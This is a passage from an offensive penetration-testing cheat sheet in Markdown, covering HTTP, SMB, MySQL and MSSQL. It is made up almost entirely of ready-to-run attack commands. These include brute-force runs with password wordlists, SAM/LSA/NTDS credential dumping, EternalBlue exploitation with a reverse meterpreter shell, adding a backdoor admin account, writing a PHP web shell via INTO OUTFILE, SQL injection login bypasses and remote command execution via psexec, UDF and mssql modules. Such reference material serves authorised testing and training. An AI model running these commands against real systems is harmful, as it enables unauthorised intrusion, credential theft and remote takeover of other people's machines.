curl -k https://<target_ip>  # Ignore SSL errors
curl --head http://<target_ip>  # HEAD request

# wget commands
wget http://<target_ip>
wget -O output.html http://<target_ip>
wget -S http://<target_ip>  # Show server response
wget --spider http://<target_ip>  # Check if URL exists
wget -r http://<target_ip>  # Recursive download
wget -m http://<target_ip>  # Mirror website
wget --user=admin --password=pass http://<target_ip>

# WhatWeb - Web technology detection
whatweb http://<target_ip>
whatweb -v http://<target_ip>
whatweb -a 3 http://<target_ip>  # Aggression level 3
whatweb --log-verbose=output.txt http://<target_ip>

# HTTPie
http http://<target_ip>
http GET http://<target_ip>
http HEAD http://<target_ip>
http --headers http://<target_ip>
```

### 📁 Directory & File Enumeration
```bash
# Gobuster - Directory brute forcing
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<target_ip> -w wordlist.txt -x php,html,txt,zip
gobuster dir -u http://<target_ip> -w wordlist.txt -t 50  # 50 threads
gobuster dir -u http://<target_ip> -w wordlist.txt -s "200,204,301,302,307,401,403"
gobuster dir -u http://<target_ip> -w wordlist.txt -b "404,500"  # Exclude status codes
gobuster dir -u http://<target_ip> -w wordlist.txt -k  # Skip SSL verification
gobuster dir -u http://<target_ip> -w wordlist.txt -U username -P password  # Basic auth
gobuster dir -u http://<target_ip> -w wordlist.txt -o output.txt
gobuster dir -u http://<target_ip> -w wordlist.txt -c "session=abc123"  # Cookies

# Gobuster DNS mode
gobuster dns -d domain.com -w subdomains.txt
gobuster dns -d domain.com -w subdomains.txt -i  # Show IP addresses

# Gobuster vhost mode
gobuster vhost -u http://<target_ip> -w subdomains.txt
gobuster vhost -u http://domain.com -w subdomains.txt

# Dirb - Directory scanner
dirb http://<target_ip>
dirb http://<target_ip> /usr/share/wordlists/dirb/common.txt
dirb http://<target_ip> wordlist.txt -o output.txt
dirb http://<target_ip> wordlist.txt -X .php,.html,.txt
dirb http://<target_ip> wordlist.txt -u username:password
dirb http://<target_ip> wordlist.txt -c "COOKIE:value"
dirb http://<target_ip> wordlist.txt -H "Authorization: Bearer token"
dirb http://<target_ip> wordlist.txt -z 100  # Delay 100ms

# Dirsearch
dirsearch -u http://<target_ip>
dirsearch -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
dirsearch -u http://<target_ip> -e php,html,js,txt
dirsearch -u http://<target_ip> -x 404,500,503
dirsearch -u http://<target_ip> -t 50
dirsearch -u http://<target_ip> -r  # Recursive
dirsearch -u http://<target_ip> --auth-type basic --auth admin:password

# ffuf - Fast web fuzzer
ffuf -u http://<target_ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://<target_ip>/FUZZ -w wordlist.txt -e .php,.html,.txt
ffuf -u http://<target_ip>/FUZZ -w wordlist.txt -mc 200,301,302
ffuf -u http://<target_ip>/FUZZ -w wordlist.txt -fc 404
ffuf -u http://<target_ip>/FUZZ -w wordlist.txt -t 100
ffuf -u http://<target_ip>/FUZZ -w wordlist.txt -o output.json -of json
ffuf -u http://<target_ip>/FUZZ -w wordlist.txt -H "Authorization: Bearer token"
ffuf -u http://<target_ip>/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Parameter fuzzing with ffuf
ffuf -u "http://<target_ip>/page.php?FUZZ=value" -w parameters.txt
ffuf -u "http://<target_ip>/page.php?param=FUZZ" -w values.txt

# WFuzz
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://<target_ip>/FUZZ
wfuzz -c -z file,wordlist.txt --hc 404 http://<target_ip>/FUZZ
wfuzz -c -z file,wordlist.txt -d "username=admin&password=FUZZ" http://<target_ip>/login.php
```

### 🔧 Nikto - Web Server Scanner
```bash
# Basic Nikto scans
nikto -h http://<target_ip>
nikto -h http://<target_ip> -p 80,443,8080
nikto -h http://<target_ip> -ssl  # Force SSL
nikto -h http://<target_ip> -nossl  # Disable SSL
nikto -h http://<target_ip> -o output.txt
nikto -h http://<target_ip> -Format txt -o output.txt
nikto -h http://<target_ip> -Format html -o output.html
nikto -h http://<target_ip> -Format xml -o output.xml

# Nikto with authentication
nikto -h http://<target_ip> -id username:password
nikto -h http://<target_ip> -id "username:password"

# Nikto tuning options
nikto -h http://<target_ip> -Tuning 1  # Interesting files
nikto -h http://<target_ip> -Tuning 2  # Misconfiguration
nikto -h http://<target_ip> -Tuning 3  # Information disclosure
nikto -h http://<target_ip> -Tuning 4  # Injection (XSS/Script/HTML)
nikto -h http://<target_ip> -Tuning 5  # Remote file retrieval
nikto -h http://<target_ip> -Tuning 6  # Denial of service
nikto -h http://<target_ip> -Tuning 7  # Remote file retrieval (internal IP)
nikto -h http://<target_ip> -Tuning 8  # Command execution
nikto -h http://<target_ip> -Tuning 9  # SQL injection
nikto -h http://<target_ip> -Tuning 0  # File upload
nikto -h http://<target_ip> -Tuning a  # Authentication bypass
nikto -h http://<target_ip> -Tuning b  # Software identification
nikto -h http://<target_ip> -Tuning c  # Remote source inclusion
nikto -h http://<target_ip> -Tuning x  # Reverse tuning (all except x)

# Multiple tuning options
nikto -h http://<target_ip> -Tuning 123
nikto -h http://<target_ip> -Tuning 123456789
nikto -h http://<target_ip> -Tuning x6  # All except DoS

# Nikto with custom options
nikto -h http://<target_ip> -useragent "Custom User Agent"
nikto -h http://<target_ip> -Display V  # Verbose
nikto -h http://<target_ip> -evasion 1  # Random URI encoding
nikto -h http://<target_ip> -maxtime 30m  # Max scan time
nikto -h http://<target_ip> -timeout 10  # Timeout per request
```

### 🔧 Metasploit HTTP Modules
```bash
msfconsole

# HTTP version scanner
use auxiliary/scanner/http/http_version
set RHOSTS <target_ip>
run

# HTTP header scanner
use auxiliary/scanner/http/http_header
set RHOSTS <target_ip>
set IGN_HEADER Content-Type
run

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target_ip>
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# HTTP file scanner
use auxiliary/scanner/http/files_dir
set RHOSTS <target_ip>
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# HTTP robots.txt scanner
use auxiliary/scanner/http/robots_txt
set RHOSTS <target_ip>
run

# HTTP login scanner
use auxiliary/scanner/http/http_login
set RHOSTS <target_ip>
set AUTH_URI /admin/login.php
set USERPASS_FILE /usr/share/wordlists/default-credentials.txt
run

# HTTP brute force
use auxiliary/scanner/http/http_login
set RHOSTS <target_ip>
set AUTH_URI /login.php
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# HTTP PUT method check
use auxiliary/scanner/http/http_put
set RHOSTS <target_ip>
set PATH /uploads
set FILENAME test.txt
set FILEDATA "Test content"
run

# Apache user enumeration
use auxiliary/scanner/http/apache_userdir_enum
set RHOSTS <target_ip>
set USER_FILE users.txt
run

# WordPress scanner
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS <target_ip>
run

# WordPress login brute force
use auxiliary/scanner/http/wordpress_login_enum
set RHOSTS <target_ip>
set USERNAME admin
set PASS_FILE passwords.txt
run

# Joomla scanner
use auxiliary/scanner/http/joomla_version
set RHOSTS <target_ip>
run

# Drupal enumeration
use auxiliary/scanner/http/drupal_views_user_enum
set RHOSTS <target_ip>
run

# HTTP open proxy scanner
use auxiliary/scanner/http/open_proxy
set RHOSTS <target_ip>
run

# HTTP SQL injection scanner
use auxiliary/scanner/http/blind_sql_query
set RHOSTS <target_ip>
run

# Shellshock scanner
use auxiliary/scanner/http/apache_mod_cgi_bash_env
set RHOSTS <target_ip>
set TARGETURI /cgi-bin/test.sh
run

# SSL certificate checker
use auxiliary/scanner/http/cert
set RHOSTS <target_ip>
run

# HTTP trace method check
use auxiliary/scanner/http/trace
set RHOSTS <target_ip>
run

# WebDAV scanner
use auxiliary/scanner/http/webdav_scanner
set RHOSTS <target_ip>
set PATH /webdav
run

# WebDAV internal IP disclosure
use auxiliary/scanner/http/webdav_internal_ip
set RHOSTS <target_ip>
set PATH /webdav
run

# WebDAV website content
use auxiliary/scanner/http/webdav_website_content
set RHOSTS <target_ip>
set PATH /webdav
run
```

### 🔐 HTTP Authentication Testing
```bash
# Basic authentication with cURL
curl -u username:password http://<target_ip>/admin
curl --user username:password http://<target_ip>/admin
curl -H "Authorization: Basic base64string" http://<target_ip>/admin

# Generate base64 for basic auth
echo -n "username:password" | base64

# Bearer token authentication
curl -H "Authorization: Bearer token123" http://<target_ip>/api

# Custom header authentication
curl -H "X-API-Key: key123" http://<target_ip>/api
curl -H "X-Auth-Token: token123" http://<target_ip>/api

# HTTP methods enumeration
curl -X OPTIONS http://<target_ip> -i
nmap -p 80 --script http-methods http://<target_ip>

# Test HTTP methods
curl -X GET http://<target_ip>
curl -X POST http://<target_ip>
curl -X PUT http://<target_ip>
curl -X DELETE http://<target_ip>
curl -X TRACE http://<target_ip>
curl -X OPTIONS http://<target_ip>
```

---

## 📋 SMB (Port 139, 445)

### 🔍 Discovery & Enumeration
```bash
# Nmap SMB scanning
nmap -p 139,445 -sV -sC <target_ip>
nmap -p 445 --script smb-* <target_ip>
nmap -p 445 --script smb-os-discovery <target_ip>
nmap -p 445 --script smb-enum-shares <target_ip>
nmap -p 445 --script smb-enum-users <target_ip>
nmap -p 445 --script smb-enum-domains <target_ip>
nmap -p 445 --script smb-enum-groups <target_ip>
nmap -p 445 --script smb-enum-processes <target_ip>
nmap -p 445 --script smb-enum-services <target_ip>
nmap -p 445 --script smb-enum-sessions <target_ip>
nmap -p 445 --script smb-security-mode <target_ip>
nmap -p 445 --script smb-protocols <target_ip>
nmap -p 445 --script smb-vuln* <target_ip>
nmap -p 445 --script smb-vuln-ms17-010 <target_ip>  # EternalBlue
nmap -p 445 --script smb-vuln-ms08-067 <target_ip>
nmap -p 445 --script smb-double-pulsar-backdoor <target_ip>
nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>

# SMBClient - List shares
smbclient -L //<target_ip> -N
smbclient -L //<target_ip> -U ""
smbclient -L //<target_ip> -U username
smbclient -L //<target_ip> -U username%password
smbclient -L \\\\<target_ip>\\  # Alternative syntax

# SMBClient - Connect to share
smbclient //<target_ip>/sharename -N
smbclient //<target_ip>/sharename -U username
smbclient //<target_ip>/sharename -U username%password
smbclient //<target_ip>/IPC$ -N
smbclient //<target_ip>/ADMIN$ -U administrator%password
smbclient //<target_ip>/C$ -U administrator%password

# SMBClient commands (inside session)
ls                      # List files
cd directory           # Change directory
pwd                    # Print working directory
get filename           # Download file
mget *                 # Download all files
put filename           # Upload file
mput *                 # Upload all files
del filename           # Delete file
mkdir directory        # Create directory
rmdir directory        # Remove directory
more filename          # View file content
!ls                    # Execute local command
!pwd                   # Local directory
help                   # Show commands
exit                   # Exit session

# RPCClient - Remote procedure call
rpcclient -U "" <target_ip>
rpcclient -U ""  -N <target_ip>
rpcclient -U username%password <target_ip>

# RPCClient commands (inside session)
srvinfo                # Server information
enumdomusers           # Enumerate domain users
enumdomgroups          # Enumerate domain groups
queryuser <RID>        # Query specific user
querygroup <RID>       # Query specific group
querydominfo           # Query domain information
enumdomains            # Enumerate domains
lsaquery               # LSA query
lookupnames username   # Lookup user SID
lookupsids <SID>       # Lookup SID
netshareenum           # Enumerate shares
netshareenumall        # Enumerate all shares
netsharegetinfo share  # Get share information
help                   # Show commands
exit                   # Exit

# SMBMap
smbmap -H <target_ip>
smbmap -H <target_ip> -u guest
smbmap -H <target_ip> -u username -p password
smbmap -H <target_ip> -u username -p password -r sharename  # Recursive list
smbmap -H <target_ip> -u username -p password -R sharename  # Recursive list with details
smbmap -H <target_ip> -u username -p password -d domain
smbmap -H <target_ip> -u username -p password -A '.*'  # Download all files
smbmap -H <target_ip> -u username -p password --download 'sharename\file.txt'
smbmap -H <target_ip> -u username -p password --upload '/local/file.txt' 'sharename\file.txt'
smbmap -H <target_ip> -u username -p password -x 'whoami'  # Execute command
smbmap -H <target_ip> -u username -p password -L  # List drives
smbmap -H <target_ip> -u username -p password -r 'C$'  # List C drive

# Enum4linux
enum4linux <target_ip>
enum4linux -a <target_ip>  # All enumeration
enum4linux -U <target_ip>  # Users
enum4linux -S <target_ip>  # Shares
enum4linux -G <target_ip>  # Groups
enum4linux -P <target_ip>  # Password policy
enum4linux -o <target_ip>  # OS information
enum4linux -i <target_ip>  # Printer information
enum4linux -r <target_ip>  # RID cycling
enum4linux -u username -p password <target_ip>
enum4linux -u username -p password -a <target_ip>

# CrackMapExec
crackmapexec smb <target_ip>
crackmapexec smb <target_ip> -u '' -p ''  # Null session
crackmapexec smb <target_ip> -u username -p password
crackmapexec smb <target_ip> -u username -H NTHASH
crackmapexec smb <target_ip> -u users.txt -p passwords.txt
crackmapexec smb <target_ip> -u username -p password --shares
crackmapexec smb <target_ip> -u username -p password --users
crackmapexec smb <target_ip> -u username -p password --groups
crackmapexec smb <target_ip> -u username -p password --local-auth
crackmapexec smb <target_ip> -u username -p password -x 'whoami'
crackmapexec smb <target_ip> -u username -p password -X '$PSVersionTable'
crackmapexec smb <target_ip> -u username -p password -M spider_plus
crackmapexec smb <target_ip> -u username -p password --sam  # Dump SAM
crackmapexec smb <target_ip> -u username -p password --lsa  # Dump LSA secrets
crackmapexec smb <target_ip> -u username -p password --ntds  # Dump NTDS.dit
crackmapexec smb <target_ip> -u username -p password --pass-pol  # Password policy
crackmapexec smb <target_ip> -u username -p password --rid-brute  # RID cycling
crackmapexec smb 192.168.1.0/24 -u username -p password  # Subnet scan
crackmapexec smb <target_ip> -u username -p password -d domain.com
crackmapexec smb <target_ip> --gen-relay-list relay_targets.txt  # Generate relay targets

# Impacket tools
impacket-smbclient username:password@<target_ip>
impacket-smbclient domain/username:password@<target_ip>
impacket-smbclient -hashes LMHASH:NTHASH username@<target_ip>

# NBTScan - NetBIOS scanner
nbtscan <target_ip>
nbtscan -r 192.168.1.0/24
nbtscan -v <target_ip>

# NMBlookup
nmblookup -A <target_ip>
nmblookup <hostname>

# SMBGet - Download files
smbget smb://<target_ip>/share/file.txt
smbget -R smb://<target_ip>/share/  # Recursive download
smbget -u username -p password smb://<target_ip>/share/file.txt
```

### 🔓 SMB Authentication & Brute Force
```bash
# Hydra SMB brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<target_ip>
hydra -L users.txt -P passwords.txt smb://<target_ip>
hydra -l admin -P passwords.txt smb://<target_ip> -t 4
hydra -C /usr/share/wordlists/default-credentials.txt smb://<target_ip>

# Medusa SMB brute force
medusa -h <target_ip> -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt
medusa -h <target_ip> -U users.txt -P passwords.txt -M smbnt

# Ncrack SMB brute force
ncrack -p 445 --user administrator -P /usr/share/wordlists/rockyou.txt <target_ip>

# CrackMapExec brute force
crackmapexec smb <target_ip> -u users.txt -p passwords.txt --no-bruteforce
crackmapexec smb <target_ip> -u users.txt -p passwords.txt --continue-on-success

# Metasploit SMB modules
msfconsole

use auxiliary/scanner/smb/smb_version
set RHOSTS <target_ip>
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <target_ip>
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <target_ip>
set SMBUSER username
set SMBPASS password
run

use auxiliary/scanner/smb/smb_login
set RHOSTS <target_ip>
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

use auxiliary/scanner/smb/smb_lookupsid
set RHOSTS <target_ip>
run

use auxiliary/scanner/smb/smb2
set RHOSTS <target_ip>
run

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target_ip>
run

use auxiliary/admin/smb/check_dir_file
set RHOSTS <target_ip>
set SMBSHARE sharename
set FILE_OR_DIR /path/to/check
run

use auxiliary/admin/smb/upload_file
set RHOSTS <target_ip>
set SMBSHARE C$
set LPATH /local/file.exe
set RPATH /Windows/Temp/file.exe
run

use auxiliary/admin/smb/download_file
set RHOSTS <target_ip>
set SMBSHARE C$
set RPATH /Windows/System32/config/SAM
set LPATH /tmp/SAM
run
```

### 💥 SMB Exploitation (EternalBlue)
```bash
# Metasploit EternalBlue exploitation
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <your_ip>
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
exploit

use exploit/windows/smb/ms17_010_psexec
set RHOSTS <target_ip>
set LHOST <your_ip>
set SMBUser administrator
set SMBPass password
exploit

use auxiliary/admin/smb/ms17_010_command
set RHOSTS <target_ip>
set COMMAND net user hacker Password123! /add
run

# PSExec - Remote command execution
impacket-psexec username:password@<target_ip>
impacket-psexec domain/username:password@<target_ip>
impacket-psexec administrator:password@<target_ip> cmd.exe
impacket-psexec -hashes LMHASH:NTHASH administrator@<target_ip>

# WMIExec - Windows Management Instrumentation
impacket-wmiexec username:password@<target_ip>
impacket-wmiexec domain/username:password@<target_ip>
impacket-wmiexec -hashes LMHASH:NTHASH administrator@<target_ip>

# SMBExec
impacket-smbexec username:password@<target_ip>
impacket-smbexec domain/username:password@<target_ip>
impacket-smbexec -hashes LMHASH:NTHASH administrator@<target_ip>

# AtExec - Schedule task execution
impacket-atexec username:password@<target_ip> "whoami"
impacket-atexec domain/username:password@<target_ip> "ipconfig"

# DComExec
impacket-dcomexec username:password@<target_ip>
impacket-dcomexec -hashes LMHASH:NTHASH administrator@<target_ip>
```

### 🔍 SMB Share Mounting
```bash
# Mount SMB share on Linux
mount -t cifs //<target_ip>/sharename /mnt/smb
mount -t cifs -o username=user,password=pass //<target_ip>/share /mnt/smb
mount -t cifs -o username=user,password=pass,vers=1.0 //<target_ip>/share /mnt/smb
mount -t cifs -o guest //<target_ip>/share /mnt/smb

# Unmount
umount /mnt/smb

# smbmount (older systems)
smbmount //<target_ip>/share /mnt/smb -o username=user,password=pass

# Edit /etc/fstab for persistent mount
//<target_ip>/share  /mnt/smb  cifs  username=user,password=pass  0  0
```

---

## 📋 MySQL (Port 3306)

### 🔍 Discovery & Enumeration
```bash
# Nmap MySQL scanning
nmap -p 3306 -sV -sC <target_ip>
nmap -p 3306 --script mysql-* <target_ip>
nmap -p 3306 --script mysql-info <target_ip>
nmap -p 3306 --script mysql-databases --script-args mysqluser=root,mysqlpass=password <target_ip>
nmap -p 3306 --script mysql-variables --script-args mysqluser=root,mysqlpass=password <target_ip>
nmap -p 3306 --script mysql-enum --script-args mysqluser=root,mysqlpass=password <target_ip>
nmap -p 3306 --script mysql-audit --script-args "mysql-audit.username=root,mysql-audit.password=password" <target_ip>
nmap -p 3306 --script mysql-dump-hashes --script-args username=root,password=password <target_ip>
nmap -p 3306 --script mysql-query --script-args "query='select version()'" <target_ip>
nmap -p 3306 --script mysql-vuln-cve2012-2122 <target_ip>
nmap -p 3306 --script mysql-empty-password <target_ip>
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>

# Banner grabbing
nc -nv <target_ip> 3306
telnet <target_ip> 3306
```

### 🔓 MySQL Authentication & Access
```bash
# MySQL login
mysql -h <target_ip> -u root -p
mysql -h <target_ip> -u username -ppassword
mysql -h <target_ip> -u root -proot
mysql --host=<target_ip> --user=root --password=password
mysql -h <target_ip> -P 3306 -u root -p

# MySQL without password
mysql -h <target_ip> -u root
mysql -h <target_ip> -u root -p''

# MySQL with database
mysql -h <target_ip> -u root -p -D database_name
mysql -h <target_ip> -u root -p database_name

# Execute SQL from command line
mysql -h <target_ip> -u root -p -e "SHOW DATABASES;"
mysql -h <target_ip> -u root -p -e "SELECT user,password FROM mysql.user;"
mysql -h <target_ip> -u root -p database_name -e "SELECT * FROM users;"

# Execute SQL from file
mysql -h <target_ip> -u root -p < script.sql
mysql -h <target_ip> -u root -p database_name < data.sql
```

### 🔓 MySQL Brute Force
```bash
# Hydra MySQL brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target_ip>
hydra -L users.txt -P passwords.txt mysql://<target_ip>
hydra -l root -P passwords.txt mysql://<target_ip> -t 4
hydra -l root -P passwords.txt mysql://<target_ip> -V -f

# Medusa MySQL brute force
medusa -h <target_ip> -u root -P /usr/share/wordlists/rockyou.txt -M mysql
medusa -h <target_ip> -U users.txt -P passwords.txt -M mysql

# Ncrack MySQL brute force
ncrack -p 3306 --user root -P /usr/share/wordlists/rockyou.txt <target_ip>

# Metasploit MySQL modules
msfconsole

use auxiliary/scanner/mysql/mysql_version
set RHOSTS <target_ip>
run

use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target_ip>
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS <target_ip>
set USERNAME root
set PASSWORD password
run

use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS <target_ip>
set USERNAME root
set PASSWORD password
run

use auxiliary/admin/mysql/mysql_enum
set RHOSTS <target_ip>
set USERNAME root
set PASSWORD password
run

use auxiliary/admin/mysql/mysql_sql
set RHOSTS <target_ip>
set USERNAME root
set PASSWORD password
set SQL "SHOW DATABASES;"
run

use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS <target_ip>
set USERNAME root
set PASSWORD password
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
run

use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS <target_ip>
set USERNAME root
set PASSWORD password
run
```

### 📊 MySQL Commands & Queries
```bash
# Inside MySQL session

# Database operations
SHOW DATABASES;                              # List all databases
CREATE DATABASE dbname;                       # Create database
USE database_name;                           # Select database
DROP DATABASE dbname;                        # Delete database
SELECT DATABASE();                           # Current database
SHOW TABLES;                                # List tables in current database
SHOW TABLES FROM database_name;             # List tables in specific database

# Table operations
DESCRIBE table_name;                        # Show table structure
DESC table_name;                            # Alternative
SHOW COLUMNS FROM table_name;               # Show columns
SHOW CREATE TABLE table_name;               # Show CREATE statement
SELECT * FROM table_name;                   # Select all data
SELECT column1, column2 FROM table_name;    # Select specific columns
SELECT * FROM table_name WHERE condition;   # Conditional select
SELECT * FROM table_name LIMIT 10;          # Limit results
CREATE TABLE users (id INT, name VARCHAR(50), password VARCHAR(50));
DROP TABLE table_name;                      # Delete table
TRUNCATE TABLE table_name;                  # Delete all data

# User and privilege information
SELECT user,host FROM mysql.user;           # List users
SELECT user,password FROM mysql.user;       # User passwords (MySQL < 5.7)
SELECT user,authentication_string FROM mysql.user;  # User passwords (MySQL >= 5.7)
SELECT user,host,password FROM mysql.user WHERE user='root';
SELECT * FROM mysql.user WHERE user='root'\G  # Detailed user info
SELECT user,host,Grant_priv,Super_priv FROM mysql.user;
SHOW GRANTS;                                # Current user privileges
SHOW GRANTS FOR 'username'@'localhost';     # Specific user privileges
SELECT * FROM information_schema.user_privileges;
SELECT grantee, privilege_type FROM information_schema.user_privileges;

# Create and manage users
CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';
CREATE USER 'username'@'%' IDENTIFIED BY 'password';  # Any host
GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost';
GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost';
GRANT SELECT, INSERT ON database_name.table_name TO 'username'@'localhost';
FLUSH PRIVILEGES;                           # Reload privileges
SET PASSWORD FOR 'username'@'localhost' = PASSWORD('newpassword');
DROP USER 'username'@'localhost';           # Delete user
RENAME USER 'old_username'@'localhost' TO 'new_username'@'localhost';

# Information schema queries
SELECT table_schema,table_name FROM information_schema.tables;
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema';
SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name';
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema = 'database_name';

# System information
SELECT VERSION();                           # MySQL version
SELECT USER();                              # Current user
SELECT CURRENT_USER();                      # Current user (alternative)
SELECT SYSTEM_USER();                       # System user
SELECT SESSION_USER();                      # Session user
SELECT @@version;                           # Version (alternative)
SELECT @@hostname;                          # Hostname
SELECT @@datadir;                           # Data directory
SELECT @@basedir;                           # Base directory
SELECT @@tmpdir;                            # Temp directory
SHOW VARIABLES;                             # All variables
SHOW VARIABLES LIKE '%version%';            # Version variables
SHOW VARIABLES LIKE '%dir%';                # Directory variables
SHOW VARIABLES LIKE 'secure_file_priv';     # File operations directory
SHOW STATUS;                                # Server status
SHOW PROCESSLIST;                           # Active connections

# File operations (if FILE privilege exists)
SELECT LOAD_FILE('/etc/passwd');            # Read file
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT "<?php phpinfo(); ?>" INTO OUTFILE '/var/www/html/info.php';
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
SELECT user,password FROM mysql.user INTO OUTFILE '/tmp/mysql_users.txt';

# Log files
SHOW VARIABLES LIKE 'general_log%';         # General log location
SHOW VARIABLES LIKE 'log_error';            # Error log location
SHOW VARIABLES LIKE 'slow_query_log%';      # Slow query log

# Exploit techniques
SELECT 1,2,3,4,5;                          # Union select test
' OR '1'='1                                 # SQL injection
' OR 1=1--                                  # SQL injection
' OR 1=1#                                   # SQL injection
admin' OR '1'='1                           # SQL injection login bypass

# Export database
mysqldump -h <target_ip> -u root -p database_name > backup.sql
mysqldump -h <target_ip> -u root -p --all-databases > all_databases.sql
mysqldump -h <target_ip> -u root -p database_name table_name > table_backup.sql

# Import database
mysql -h <target_ip> -u root -p database_name < backup.sql
mysql -h <target_ip> -u root -p < all_databases.sql

# Exit MySQL
EXIT;
QUIT;
\q
```

### 🔧 Advanced MySQL Techniques
```bash
# MySQL UDF (User Defined Function) exploitation
# Requires FILE privilege and write access to plugin directory
SELECT @@plugin_dir;  # Find plugin directory

# Then use Metasploit or manual UDF injection
use exploit/multi/mysql/mysql_udf_payload
set RHOSTS <target_ip>
set USERNAME root
set PASSWORD password
exploit

# MySQL command execution via sys_exec (if UDF loaded)
SELECT sys_exec('whoami');
SELECT sys_eval('whoami');

# Raptor MySQL exploit (CVE-2016-6662)
# Requires specific vulnerable versions

# Read MySQL config
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('C:/xampp/mysql/bin/my.ini');

# Check for weak permissions
SELECT * FROM mysql.user WHERE authentication_string = '' OR password = '';
```

---

## 📋 MSSQL (Port 1433)

### 🔍 Discovery & Enumeration
```bash
# Nmap MSSQL scanning
nmap -p 1433 -sV -sC <target_ip>
nmap -p 1433 --script ms-sql-* <target_ip>
nmap -p 1433 --script ms-sql-info <target_ip>
nmap -p 1433 --script ms-sql-ntlm-info <target_ip>
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>
nmap -p 1433 --script ms-sql-empty-password <target_ip>
nmap -p 1433 --script ms-sql-config <target_ip>
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=password <target_ip>

# Banner grabbing
nc -nv <target_ip> 1433
```

### 🔓 MSSQL Authentication & Access
```bash
# sqsh - SQL shell
sqsh -S <target_ip> -U sa -P password
sqsh -S <target_ip>:1433 -U username -P password
sqsh -S <target_ip> -U sa -P '' -D database_name

# Inside sqsh session
go                      # Execute query
\g                      # Execute query (alternative)
\quit                   # Exit
\reconnect              # Reconnect

# Impacket mssqlclient
impacket-mssqlclient sa:password@<target_ip>
impacket-mssqlclient domain/username:password@<target_ip>
impacket-mssqlclient username:password@<target_ip> -windows-auth
impacket-mssqlclient username:password@<target_ip> -port 1433
impacket-mssqlclient -hashes LMHASH:NTHASH administrator@<target_ip>

# PowerShell (Windows)
Invoke-Sqlcmd -ServerInstance "<target_ip>" -Query "SELECT @@VERSION"
Invoke-Sqlcmd -ServerInstance "<target_ip>" -Username "sa" -Password "password" -Query "SELECT name FROM sys.databases"
```

### 🔓 MSSQL Brute Force
```bash
# Hydra MSSQL brute force
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<target_ip>
hydra -L users.txt -P passwords.txt mssql://<target_ip>
hydra -l sa -P passwords.txt mssql://<target_ip> -t 4

# Medusa MSSQL brute force
medusa -h <target_ip> -u sa -P /usr/share/wordlists/rockyou.txt -M mssql
medusa -h <target_ip> -U users.txt -P passwords.txt -M mssql

# Metasploit MSSQL modules
msfconsole

use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <target_ip>
run

use auxiliary/scanner/mssql/mssql_login
set RHOSTS <target_ip>
set USERNAME sa
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

use auxiliary/admin/mssql/mssql_enum
set RHOSTS <target_ip>
set USERNAME sa
set PASSWORD password
run

use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS <target_ip>
set USERNAME sa
set PASSWORD password
run

use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS <target_ip>
set USERNAME sa
set PASSWORD password
run

use auxiliary/admin/mssql/mssql_exec
set RHOSTS <target_ip>
set USERNAME sa
set PASSWORD password
set CMD whoami
run

use auxiliary/admin/mssql/mssql_sql
set RHOSTS <target_ip>
set USERNAME sa
set PASSWORD password
set SQL "SELECT @@VERSION"
run

use auxiliary/scanner/mssql/mssql_hashdump
set RHOSTS <target_ip>
set USERNAME sa
set PASSWORD password
run

use exploit/windows/mssql/mssql_payload
set RHOSTS <target_ip>
set USERNAME sa
set PASSWORD password
set LHOST <your_ip>
exploit
```

### 📊 MSSQL Commands & Queries
```bash
# Inside MSSQL session (sqsh or mssqlclient)

# Database operations
SELECT @@VERSION;                           # MSSQL version
SELECT name FROM sys.databases;             # List databases
